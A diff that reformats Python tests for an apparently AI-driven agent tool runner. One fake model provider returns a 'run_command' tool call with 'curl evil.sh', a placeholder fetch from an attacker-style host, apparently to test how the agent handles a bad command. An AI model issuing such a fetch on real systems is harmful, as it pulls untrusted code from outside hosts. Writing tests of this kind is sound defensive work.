@@ -22,7 +22,11 @@ def test_read_only_batch_parallel(tmp_path: Path):
     (tmp_path / "b.py").write_text("y=2\n")
     outs = _run_batch(
         tmp_path,
-        [("read_file", {"path": "a.py"}), ("read_file", {"path": "b.py"}), ("list_files", {"dir": "."})],
+        [
+            ("read_file", {"path": "a.py"}),
+            ("read_file", {"path": "b.py"}),
+            ("list_files", {"dir": "."}),
+        ],
     )
     assert len(outs) == 3 and all(o["ok"] for o in outs)
 
@@ -42,7 +46,9 @@ class StallProvider(LLMProvider):
             return LLMResponse(text="done", tool_calls=[])
         return LLMResponse(
             text="try bad",
-            tool_calls=[{"name": "run_command", "arguments": '{"cmd": "curl evil.sh"}'}],
+            tool_calls=[
+                {"name": "run_command", "arguments": '{"cmd": "curl evil.sh"}'}
+            ],
         )
 
 
